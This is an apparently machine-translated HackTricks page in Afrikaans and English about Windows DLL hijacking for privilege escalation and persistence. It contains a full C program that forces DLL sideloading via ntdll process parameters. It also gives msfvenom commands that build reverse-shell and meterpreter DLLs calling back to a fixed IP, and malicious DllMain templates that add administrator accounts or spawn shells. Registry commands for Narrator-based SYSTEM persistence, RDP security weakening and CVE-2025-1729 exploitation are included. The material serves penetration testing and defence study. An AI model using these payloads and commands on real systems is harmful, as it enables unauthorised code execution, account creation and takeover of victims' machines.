# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basiese Inligting

DLL Hijacking behels die manipulasie van 'n vertroude toepassing om 'n kwaadwillige DLL te laai. Hierdie term sluit verskeie taktieke in soos **DLL Spoofing, Injection, and Side-Loading**. Dit word hoofsaaklik gebruik vir code execution, om persistence te bewerkstellig, en, minder algemeen, vir privilege escalation. Ten spyte van die fokus op escalation hier, bly die metode van hijacking oor doelwitte heen konsekwent.

### Algemene Tegnieke

Verskeie metodes word gebruik vir DLL hijacking, elk se doeltreffendheid hang af van die toepassing se DLL-laaistategie:

1. **DLL Replacement**: Die vervanging van 'n egte DLL met 'n kwaadwillige een, opsioneel deur DLL Proxying te gebruik om die oorspronklike DLL se funksionaliteit te behou.
2. **DLL Search Order Hijacking**: Deur die kwaadwillige DLL in 'n soekpad voor die wettige een te plaas, en die toepassing se soekpatroon uit te buit.
3. **Phantom DLL Hijacking**: Om 'n kwaadwillige DLL te skep wat 'n toepassing sal laai, terwyl dit dink dit is 'n nie-bestaande vereiste DLL.
4. **DLL Redirection**: Die soekparameters soos `%PATH%` of `.exe.manifest` / `.exe.local` lêers wysig om die toepassing na die kwaadwillige DLL te lei.
5. **WinSxS DLL Replacement**: Die wettige DLL in die WinSxS gids vervang met 'n kwaadwillige tegenhanger, 'n metode wat dikwels met DLL side-loading geassosieer word.
6. **Relative Path DLL Hijacking**: Die kwaadwillige DLL in 'n deur die gebruiker beheerde gids met die gekopieerde toepassing plaas, wat ooreenstem met Binary Proxy Execution techniques.

## Opsporing van ontbrekende Dlls

Die mees algemene manier om ontbrekende Dlls binne 'n stelsel te vind is om [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) van sysinternals te hardloop en die **volgende 2 filters** te stel:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

en toon net die **File System Activity**:

![](<../../../images/image (153).png>)

As jy na **ontbrekende dlls in die algemeen** soek, laat dit vir 'n paar **sekondes** loop.\
As jy na 'n **ontbrekende dll binne 'n spesifieke uitvoerbare lêer** soek, moet jy 'n ander filter stel soos "Process Name" "contains" `<exec name>`, voer dit uit, en stop dan met die vaslegging van gebeure.

## Uitbuiting van ontbrekende Dlls

Om privilege escalation te bewerkstellig, is die beste kans om 'n dll te kan skryf wat 'n privilege process sal probeer laai in een van die plekke waar dit gesoek gaan word. Daarom kan ons 'n dll skryf in 'n gids waar die dll voor die gids van die oorspronklike dll gesoek word (n vreemde geval), of ons kan skryf in 'n gids waar die dll gesoek gaan word en die oorspronklike dll in geen gids bestaan nie.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Windows toepassings soek DLLs deur 'n stel voorafbepaalde soekpade te volg in 'n bepaalde volgorde. Die probleem van DLL hijacking ontstaan wanneer 'n skadelike DLL strategies in een van hierdie gidse geplaas word, sodat dit voor die egte DLL gelaai word. 'n Oplossing om dit te voorkom is om te verseker dat die toepassing absolute paths gebruik wanneer dit na die DLLs verwys wat dit benodig.

You can see the **DLL search order on 32-bit** systems below:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Dit is die **default** soekorde met **SafeDllSearchMode** aangeskakel. Wanneer dit gedeaktiveer is, verskuif die huidige gids na tweede plek. Om hierdie funksie te deaktiveer, skep die **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registerwaarde en stel dit op 0 (default is enabled).

As die [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) funksie met **LOAD_WITH_ALTERED_SEARCH_PATH** aangeroep word, begin die soektog in die gids van die uitvoerbare module wat **LoadLibraryEx** laai.

Uiteindelik, let daarop dat **'n dll gelaai kan word deur die absolute pad aan te dui in plaas van net die naam**. In daardie geval sal daardie dll **slegs in daardie pad gesoek word** (as die dll enige afhanklikhede het, sal hulle gesoek word soos net gelaai deur naam).

Daar is ander maniere om die soekorde te verander, maar ek gaan dit nie hier verduidelik nie.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

'n Gevorderde manier om die DLL-soekpad van 'n nuut geskepte proses deterministies te beïnvloed, is om die DllPath veld in RTL_USER_PROCESS_PARAMETERS te stel wanneer die proses met ntdll’s native APIs geskep word. Deur 'n aanvaller-beheerde gids hier te voorsien, kan 'n teikenproses wat 'n geïmporteerde DLL per naam oplos (geen absolute pad en nie die veilige laaivlagte gebruik nie) gedwing word om 'n kwaadwillige DLL vanaf daardie gids te laai.

Kernidee
- Bou die process parameters met RtlCreateProcessParametersEx en voorsien 'n pasgemaakte DllPath wat na jou beheerde vouer wys (bv. die gids waar jou dropper/unpacker woon).
- Skep die proses met RtlCreateUserProcess. Wanneer die teiken-binary 'n DLL per naam oplos, sal die loader na hierdie verskafde DllPath raadpleeg tydens resolusie, wat betroubare sideloading moontlik maak selfs wanneer die kwaadwillige DLL nie saam met die teiken EXE geplaas is nie.

Notas/beperkings
- Dit beïnvloed die kindproses wat geskep word; dit verskil van SetDllDirectory, wat slegs die huidige proses beïnvloed.
- Die teiken moet 'n DLL invoer of LoadLibrary per naam gebruik (geen absolute pad en nie LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories nie).
- KnownDLLs en hardgekodeerde absolute paths kan nie gehijack word nie. Forwarded exports en SxS kan voorrang verander.

Minimale C voorbeeld (ntdll, wide strings, vereenvoudigde foutbehandeling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operasionele gebruiksvoorbeeld
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

Hierdie tegniek is in die praktyk waargeneem om multi-stage sideloading chains aan te dryf: 'n aanvanklike launcher laat 'n helper DLL val, wat dan 'n Microsoft-signed, hijackable binary spawn met 'n aangepaste DllPath om die laai van die aanvaller se DLL vanaf 'n staging directory af te dwing.

#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Privilegie-eskalering

**Requirements**:

- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

Ja, die vereistes is moeilik om te vind want **by default it's kind of weird to find a privileged executable missing a dll** en dit is selfs **more weird to have write permissions on a system path folder** (you can't by default). Maar, in misconfigured omgewings is dit moontlik.\
In die geval dat jy gelukkig is en aan die vereistes voldoen, kan jy die [UACME](https://github.com/hfiref0x/UACME) projek nagaan. Selfs al is die **main goal of the project is bypass UAC**, mag jy daar 'n **PoC** van 'n Dll hijaking vir die Windows-weergawe vind wat jy kan gebruik (waarskynlik net die pad van die folder verander waar jy write permissions het).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
En **kontroleer die toestemmings van alle gidse in PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Jy kan ook die imports van 'n executable en die exports van 'n dll nagaan met:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Vir 'n volledige gids oor hoe om **Dll Hijacking te misbruik om privilegies te verhoog** met permissies om in 'n **System Path folder** te skryf, kyk:

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) sal nagaan of jy skryfpermissies het op enige gids binne die system PATH.\
Ander interessante geoutomatiseerde gereedskap om hierdie kwesbaarheid te ontdek is **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ en _Write-HijackDll._

### Example

As jy 'n uitbuitbare scenario vind, is een van die belangrikste dinge om dit suksesvol te benut om **'n dll te skep wat ten minste al die funksies eksporteer wat die executable daaruit sal importeer**. Neem kennis dat Dll Hijacking handig kan wees om [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) of van[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Jy kan 'n voorbeeld vind van **hoe om 'n geldige dll te skep** in hierdie dll hijacking-studie gefokus op dll hijacking vir uitvoering: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Boonop kan jy in die **volgende afdeling** 'n paar **basiese dll-kodes** vind wat nuttig kan wees as **templates** of om 'n **dll te skep wat nie-vereiste funksies eksporteer**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Basies is 'n **Dll proxy** 'n Dll wat in staat is om **jou kwaadwillige kode uit te voer wanneer dit gelaai word** maar ook om te **blootstel** en **werk soos verwag** deur alle oproepe na die werklike biblioteek te herlei.

Met die tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) of [**Spartacus**](https://github.com/Accenture/Spartacus) kan jy eintlik **'n executable aandui en die biblioteek kies** wat jy wil proxify en **'n proxified dll genereer** of **die Dll aandui** en **'n proxified dll genereer**.

### **Meterpreter**

**Kry rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kry 'n meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Skep 'n gebruiker (x86; ek het nie 'n x64-weergawe gesien nie):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Jou eie

Let wel dat in verskeie gevalle die Dll wat jy compile moet **export several functions** wat deur die victim process gelaai gaan word. As hierdie functions nie bestaan nie, sal die **binary nie in staat wees om dit te laai nie** en sal die **exploit misluk**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL-voorbeeld met gebruikersaanmaak</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternatiewe C DLL met thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Gevalstudie: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe ondersoek steeds 'n voorspelbare, taalspesifieke localization DLL tydens opstart wat ge-hijack kan word vir arbitrary code execution en persistence.

Belangrike feite
- Skanderingspad (huidige builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Ouer pad (oudere builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Indien 'n skryfbare attacker-controlled DLL op die OneCore-pad bestaan, word dit gelaai en `DllMain(DLL_PROCESS_ATTACH)` uitgevoer. Geen exports word vereis nie.

Ontdekking met Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Begin Narrator en waarneem die poging om die bogenoemde pad te laai.

Minimale DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC stilheid
- 'n naïewe hijack sal die UI laat praat/uitlig. Om stil te bly, wanneer jy aanheg, enumereer Narrator-drade, open die hoofdraad (`OpenThread(THREAD_SUSPEND_RESUME)`) en `SuspendThread` dit; gaan voort in jou eie draad. Sien PoC vir volledige kode.

Trigger en persistentheid via Accessibility-konfigurasie
- Gebruikerskonteks (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Met die bogenoemde, sal die begin van Narrator die geplantte DLL laai. Op die secure desktop (aanmeldskerm), druk CTRL+WIN+ENTER om Narrator te begin.

RDP-geaktiveerde SYSTEM-uitvoering (laterale beweging)
- Laat klassieke RDP-sekuriteitslaag toe: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP na die gasheer, by die aanmeldskerm druk CTRL+WIN+ENTER om Narrator te open; jou DLL word as SYSTEM op die secure desktop uitgevoer.
- Die uitvoering stop wanneer die RDP-sessie sluit—inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- Jy kan 'n ingeboude Accessibility Tool (AT) registerinskrywing kloon (bv. CursorIndicator), dit wysig om na 'n arbitrêre binary/DLL te verwys, dit invoer, en dan `configuration` na daardie AT-naam stel. Dit deurlei arbitrêre uitvoering onder die Accessibility-raamwerk.

Aantekeninge
- Skryf onder `%windir%\System32` en die verander van HKLM-waardes vereis admin-regte.
- Alle payload-logika kan in `DLL_PROCESS_ATTACH` sit; geen exports is nodig nie.

## Gevallestudie: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Hierdie geval demonstreer **Phantom DLL Hijacking** in Lenovo se TrackPoint Quick Menu (`TPQMAssistant.exe`), getracked as **CVE-2025-1729**.

### Kwesbaarheidsbesonderhede

- **Komponent**: `TPQMAssistant.exe` geleë by `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Geskeduleerde Taak**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` hardloop daagliks om 9:30 VM onder die konteks van die aangemelde gebruiker.
- **Gidspermissies**: Skryfbaar deur `CREATOR OWNER`, wat plaaslike gebruikers toelaat om arbitrêre lêers neer te sit.
- **DLL-soekgedrag**: Pogings om `hostfxr.dll` eers vanaf sy werkgids te laai en log "NAME NOT FOUND" as dit ontbreek, wat aandui dat plaaslike gids-soekvoorrang bestaan.

### Exploit-implementering

'n Aanvaller kan 'n kwaadwillige `hostfxr.dll` stub in dieselfde gids plaas, die ontbrekende DLL uitbuit om kode-uitvoering onder die gebruiker se konteks te bewerkstellig:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Aanvalsverloop

1. As 'n standaardgebruiker, plaas `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Wag dat die geskeduleerde taak om 9:30 AM onder die huidige gebruiker se konteks loop.
3. As 'n administrateur aangeteken is wanneer die taak uitgevoer word, loop die kwaadwillige DLL in die administrateur se sessie op medium integriteit.
4. Koppel standaard UAC bypass techniques om van medium integriteit tot SYSTEM-bevoegdhede op te hef.

## Gevallestudie: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors paar dikwels MSI-based droppers met DLL side-loading om payloads onder 'n vertroude, signed proses uit te voer.

Chain overview
- Gebruiker laai die MSI af. 'n CustomAction hardloop stilweg tydens die GUI install (bv. LaunchApplication of 'n VBScript action), en stel die volgende fase weer saam uit ingesluitde hulpbronne.
- Die dropper skryf 'n legitieme, signed EXE en 'n kwaadwillige DLL na dieselfde gids (voorbeeldpaar: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Wanneer die signed EXE begin word, laai die Windows DLL search order eers wsc.dll vanaf die working directory, wat attacker code uitvoer onder 'n signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction tabel:
- Kyk vir inskrywings wat uitvoerbare lêers of VBScript hardloop. Voorbeeld van 'n verdagte patroon: LaunchApplication wat 'n ingeslote lêer op die agtergrond uitvoer.
- In Orca (Microsoft Orca.exe), inspekteer CustomAction, InstallExecuteSequence en Binary tabellen.
- Ingeslote/verdeelde payloads in die MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Kyk vir verskeie klein fragmente wat gekonkateneer en deur 'n VBScript CustomAction ontsleuteld word. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktiese sideloading met wsc_proxy.exe
- Plaas hierdie twee lêers in dieselfde vouer:
- wsc_proxy.exe: legitieme, gesigneerde host (Avast). Die proses probeer wsc.dll per naam uit sy gids laai.
- wsc.dll: aanvaller DLL. As geen spesifieke exports vereis word nie, kan DllMain volstaan; anders, bou 'n proxy DLL en stuur die vereiste exports na die egte biblioteek terwyl die payload in DllMain uitgevoer word.
- Bou 'n minimale DLL-payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Vir exportvereistes gebruik 'n proxying framework (e.g., DLLirant/Spartacus) om 'n forwarding DLL te genereer wat ook jou payload uitvoer.

- Hierdie tegniek berus op DLL-naamresolusie deur die host-binary. As die host absolute paaie of veilige laaivlagte gebruik (e.g., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), kan die hijack misluk.
- KnownDLLs, SxS, en forwarded exports kan die prioriteit beïnvloed en moet oorweeg word tydens die keuse van die host-binary en die export-stel.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
